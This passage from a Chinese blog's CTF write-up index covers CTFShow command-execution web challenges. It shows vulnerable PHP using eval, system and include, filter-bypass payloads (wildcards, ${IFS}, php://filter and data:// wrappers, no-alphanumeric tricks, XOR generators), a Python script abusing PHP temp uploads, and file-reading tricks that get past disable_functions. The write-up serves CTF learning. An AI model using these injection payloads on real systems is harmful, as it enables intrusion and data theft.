$_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123; die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123; echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123; include($ctf);&#125; 过滤了 log sess 文件包含 https://blog.csdn.net/miuzzx/article/details/109181768","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-命令执行","slug":"CTF-Show-命令执行","date":"2021-10-01T11:14:09.000Z","updated":"2021-10-01T11:14:51.490Z","comments":true,"path":"2021/10/01/CTF-Show-命令执行/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"一、CTF Show — 命令执行1.1 Web 29 — 只过滤 flag — 通配符使用1命令执行，需要严格的过滤 12345678910&lt;?php error_reporting(0); if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1234#payload?c=phpinfo();?c=system(&#x27;ls&#x27;); #flag.php index.php ?c=system(&#x27;tac fl?g.php&#x27;); 1.2 Web 30 — 过滤 system() — 其它函数使用12345678910&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1234?c=passthru(&#x27;ls&#x27;); #flag.php index.php ?c=passthru(&#x27;tac fl?g.?hp&#x27;);或者?c=passthru(&#x27;cat fl?g.?hp&#x27;); #之后查看源代码 1.3 Web 31 — 过滤部分 读取 命令12345678910&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 123?c=passthru(&quot;ls&quot;); #flag.php index.php ?c=passthru(&quot;more%09f*&quot;);?c=passthru(&quot;tac%09f*&quot;); 1.4 Web 32 — 过滤 ; — PHP include、伪协议 利用12345678910&lt;php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php 1.5 Web 33 — 过滤 ; — PHP include、伪协议 利用1&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php 1.6 Web 34 — 过滤 : — PHP include、伪协议 利用1&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php 1.7 Web 35 — 过滤 = — PHP include、伪协议 利用1&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php 1.8 Web 36 — 过滤 数字 [0-9]、/ — PHP include、伪协议 利用1&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=|\\/|[0-9]/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php 1.9 Web 37 — include — 文件包含、伪协议利用1&lt;?php //flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?c=data://text/plain,&lt;?php system(&#x27;cat f*&#x27;); #查看源代码 1.10 Web 38 — 过滤 php— 文件包含、伪协议data base64编码利用1&lt;?php //flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=data://text/plain;base64,PD9waHAKc3lzdGVtKCd0YWMgZionKTs=#PD9waHAKc3lzdGVtKCd0YWMgZionKTs=解码是&lt;?phpsystem(&#x27;tac f*&#x27;); 1.11 Web 39 — .php 后缀截断 — ?&gt;标签 //注释符 绕过1&lt;?php //flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=data://text/plain,&lt;?php system(&#x27;ls&#x27;);// #flag.php index.php ?c=data://text/plain,&lt;?php system(&#x27;tac f*&#x27;);//或者是?c=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt; #flag.php index.php .php?c=data://text/plain,&lt;?php system(&#x27;tac f*&#x27;);?&gt; 1.12 Web 40 — 无参函数构造（套娃）1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=print_r(scandir(current(localeconv()))); #Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php ) ?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));#读取数组倒数第二个元素，并使用高亮显示出来 1.13 Web 41 —过滤不严，命令执行 1&lt;?php if(isset($_POST[&#x27;c&#x27;]))&#123; $c = $_POST[&#x27;c&#x27;];if(!preg_match(&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;, $c))&#123; eval(&quot;echo($c);&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; https://wp.ctf.show/d/137-ctfshow-web-web41 1.14 Web 42 — system &gt;/dev/null 2&gt;&amp;1 — %0a 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls%0a #flag.php index.php ?c=tac flag.php%0a 1.15 Web 43 — system &gt;/dev/null 2&gt;&amp;1 — %26 绕过1&lt;?php 1?c=ls%26 #flag.php index.php ?c=tac flag.php%26 1.16 Web 44 — 过滤 flag — * 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls%0a?c=tac f*%0a 1.17 Web 45 — 过滤 空格 — || ${IFS} 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| /i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09f*||?c=tac$&#123;IFS&#125;f*||?c=tac$IFS$1f*|| 1.18 Web 46 — 过滤 * — ? 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09fl?g.php|| 1.19 Web 47 — 过滤 * — ? 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09f?ag.php 1.20 Web 48 — 过滤 * — ? 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09f?ag.php 1.21 Web 49 — 过滤 * — ? 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09f?ag.php 1.22 Web 50 — 过滤 通配符 — \\ &gt; &lt; 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=nl&lt;fl\\ag.php||?c=nl&gt;fl\\ag.php||?c=nl&lt;&gt;fl\\ag.php||?c=vi&lt;fl\\ag.php||#该题使用通配符不可行 1.23 Web 51 — 过滤 空格、通配符、$ — \\ &gt; &lt; 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=nl&lt;fl\\ag.php|| 1.24 Web 52 — 过滤 空格、通配符、&gt; &lt; — \\ $ 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1#禁止了&lt; &gt;,又释放了 $?c=ls|| #flag.php index.php ?c=nl$&#123;IFS&#125;fl\\ag.php|| #flag_here，错误的flag?c=ls$&#123;IFS&#125;/|| #bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var ?c=nl$&#123;IFS&#125;/fl\\ag|| 1.25 Web 53 — system() — nl \\ ${IFS} 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; echo($c); $d = system($c); echo &quot;&lt;br&gt;&quot;.$d; &#125;else&#123; echo &#x27;no&#x27;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls #lsflag.php index.php readflag readflag?c=nl$&#123;IFS&#125;fla\\g.php 1.26 Web 54 — system() — vi ${IFS} ? 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls #flag.php index.php ?c=vi$&#123;IFS&#125;f???.????c=vi$&#123;IFS&#125;????.??? 1.27 Web 55 — 过滤 字母 [a-z] — /bin/ + ? 绕过1&lt;?php // 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; bin 为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是 /bin/ls测试： 1touch flag.phpecho 123 &gt; flag.phpbase64 flag.php/bin/base64 flag.php 1# 利用 /bin/目录?c=/???/????64 ????.???# ?c=/bin/base64 flag.php 1# 利用 /usr/bin/目录# 我们可以利用/usr/bin下的**bzip2**,即也就是/usr/bin/bzip2 flag.php# 意思就是说我们先将flag.php文件进行压缩，然后再将其下载?c=/???/???/????2 ????.???# ?c=/usr/bin/bzip2 flag.php# 把flag.php压缩，访问 url + flag.php.bz2 就可以把压缩后的flag.php给下载下来 1.28 Web 56 — 过滤 [a-z] [0-9] — POST 包绕过（利用 . ?）1&lt;?php// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\&#123;|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; POST 上传包 1发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。将命令写入文件后，可以利用点. 来执行文件中的命令，例如. file。也可以source file，但是这题过滤了字母，因此只能用点。如何正确匹配到我们上传的文件呢？探索过程见p神的文章，最后的利用是/???/????????[@-[] 文件上传的前端 1&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;1&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;2&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# 抓包 修改文件内容为 命令 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html Python 脚本 1import requestsurl = &#x27;http://57601c3a-595e-4ea4-a88c-61daa047e7b0.challenge.ctf.show:8080/&#x27;url += &#x27;?c=. /???/????????[@-[]&#x27;#构造urlwhile True: r = requests.post(url,files=&#123;&#x27;file&#x27;:(&quot;dota.txt&quot;,&quot;cat flag.php&quot;)&#125;)#以post进行发包 flag = r.text.split(&quot;ctfshow&quot;)#split() 通过指定分隔符对字符串进行切片，如果参数 num 有指定值，则分隔 num+1 个子字符串 if len(flag)&gt;1:#说明flag获得值了！ print(r.text)#打印flag break#跳出循环 1.29 Web 57 — 过滤 [a-z] [0-9] . ? — 异或 $(())1&lt;?php// 还能炫的动吗？//flag in 36.phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\x0a|\\&gt;|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i&quot;, $c))&#123; system(&quot;cat &quot;.$c.&quot;.php&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1# . ? 均被过滤 无字母、数字终极绕过 — 异或 双小括号 (( )) 是 Bash Shell 中专门用来进行 整数运算 的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以 使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。 1root@kali:~/桌面/脚本# echo $(())0root@kali:~/桌面/脚本# echo $((~$(())))-1root@kali:~/桌面/脚本# echo $(( $((~$(()))) $((~$(()))) ))-2root@kali:~/桌面/脚本# echo $(( $((~$(()))) + $((~$(()))) ))-2# 想办法构造 36# 关于取反，经验就是如果b=~a，那么a+b=-1# payload?c=$((~$(( $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))) )))) 1# 异或脚本 $(())# -*- coding: utf-8 -*-import redef write(): #preg = &#x27;[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;]+&#x27; preg = &quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot; str = &quot;&quot; for i in range(1, 256): for j in range(1, 256): if not (re.search(preg, chr(i), re.I) or re.search(preg, chr(j), re.I)): k = i ^ j if k &gt;= 32 and k &lt;= 126: a = &#x27;%&#x27; + hex(i)[2:].zfill(2) b = &#x27;%&#x27; + hex(j)[2:].zfill(2) str = (str + chr(k) + &quot; &quot; + a + &quot; &quot; + b + &quot;\\n&quot;) fp = open(&#x27;result.txt&#x27;, &#x27;w&#x27;) fp.write(str)def produce(string): str1 = &quot;&quot; str2 = &quot;&quot; for i in string: fp = open(&#x27;result.txt&#x27;, &#x27;r&#x27;) while True: line = fp.readline() if line == &quot;&quot;: break if line[0] == i: str1 = str1 + line[2:5] str2 = str2 + line[6:9] break fp.close() result = &quot;(\\&quot;&quot; + str1 + &quot;\\&quot;^\\&quot;&quot; + str2 + &quot;\\&quot;)&quot; return resultif __name__ == &quot;__main__&quot;: write() while True: function = input(&quot;输出执行函数:&quot;) parms = input(&quot;请输出函数参数:&quot;) payload = produce(function) + produce(parms) print(payload) 1.30 Web 58 — disable_functions open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开 disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空 命令执行，突破禁用函数 1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1# 使用最常见的 c=system(&#x27;ls&#x27;);# 得到Warning: system() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1# 函数被禁用 1# 首先尝试不使用 命令执行的函数 # 套娃 函数套用c=print_r(scandir(current(localeconv())));c=print_r(scandir(dirname(&#x27;__FILE__&#x27;)));# Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )c=highlight_file(next(array_reverse(scandir(current(localeconv())))));c=highlight_file(&#x27;flag.php&#x27;);c=show_source(&#x27;flag.php&#x27;); 1# 绕disable_functions# 利用 读文件 的函数file_get_contents()highlight_file()show_source()fgets()file()var_dump()readfile()# 利用c=echo file_get_contents(&#x27;flag.php&#x27;);c=highlight_file(&#x27;flag.php&#x27;);c=show_source(&#x27;flag.php&#x27;);c=readfile(&#x27;flag.php&#x27;);c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while($b=fgets($a))&#123;echo $b;&#125;c=$handle=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;c=$handle=fopen(&#x27;flag.php&#x27;,&#x27;r&#x27;);echo fread($handle,1000); 1# 复制 重命名copy(&quot;flag.php&quot;,&quot;flag.txt&quot;); rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);# 即c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);# 后访问 URL/flag.txt 即可 1.31 Web 59 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 禁用了一些函数，不过仍可绕过 1c=show_source(&#x27;flag.php&#x27;);c=highlight_file(&#x27;flag.php&#x27;); 1.32 Web 60 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.33 Web 61 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.34 Web 62 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.35 Web 63 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.36 Web 64 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.37 Web 65 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.38 Web 66 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 尝试之前的读取文件的函数以及写入文件、重命名等等都被禁用 但是 highlight_file() 能够使用 显然换了位置 1c=print_r(scandir(&#x27;/&#x27;)); #查文件# Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var )c=highlight_file(&#x27;/flag.txt&#x27;); 1.39 Web 67 — disable_functions — var_dump(scandir(‘/‘));1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=highlight_file(&#x27;flag.php&#x27;);# print_r() 被过滤 var_dump() 代替c=var_dump(scandir(&#x27;/&#x27;));c=highlight_file(&#x27;/flag.txt&#x27;); 1.40 Web 68 — disable_functions — include(“/flag.txt”);直接显示 highlight_file() 被禁用 文件包含 include 1c=var_dump(scandir(&#x27;/&#x27;));# highlight_file() 被禁用 利用文件包含c=include(&quot;/flag.txt&quot;);# include函数会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。文件内容有代码则执行代码，否则直接输出。 1.41 Web 69 — disable_functions — var_export(scandir(‘/‘));1c=var_export(scandir(&#x27;/&#x27;));c=include(&quot;/flag.txt&quot;); 1.42 Web 701c=var_export(scandir(&#x27;/&#x27;));c=include(&quot;/flag.txt&quot;); 1.43 Web 71 — disable_functions — exit();1&lt;?phperror_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;你要上天吗？ 将所有的 字母、数字换成了 ? 强制退出 1c=highlight_file(&#x27;flag.php&#x27;);exit(); #禁用c=var_export(scandir(&#x27;/&#x27;));exit();c=include(&#x27;/flag.txt&#x27;);die(); 列目录新姿势1print_r(glob(&quot;*&quot;)); // 列当前目录print_r(glob(&quot;/*&quot;)); // 列根目录print_r(scandir(&quot;.&quot;));print_r(scandir(&quot;/&quot;));$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\\n&quot;;&#125;$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\\n&quot;;&#125;$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot; &quot;;&#125;$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125; 1c=$a=scandir(&quot;/&quot;);foreach($a as $value)&#123;echo $value.&quot; &quot;;&#125; 1c=$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot; &quot;;&#125; 1c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit(); 1$dir = new DirectoryIterator(dirname(__FILE__));foreach ($dir as $file)&#123; if($file-&gt;isFile())&#123; echo $file-&gt;getFilename().&quot;&lt;br /&gt;&quot;; &#125;&#125;exit(0);c=$dir = new DirectoryIterator(dirname(__FILE__));foreach($dir as 